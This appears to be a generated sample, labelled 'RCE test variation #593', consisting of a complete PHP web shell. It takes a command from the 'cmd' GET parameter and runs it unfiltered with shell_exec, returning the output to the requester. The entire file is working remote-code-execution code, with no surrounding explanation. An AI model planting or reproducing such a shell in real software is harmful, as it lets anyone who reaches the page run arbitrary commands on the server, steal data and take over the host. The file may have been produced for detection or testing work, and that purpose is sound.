<?php
// RCE test variation #593
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>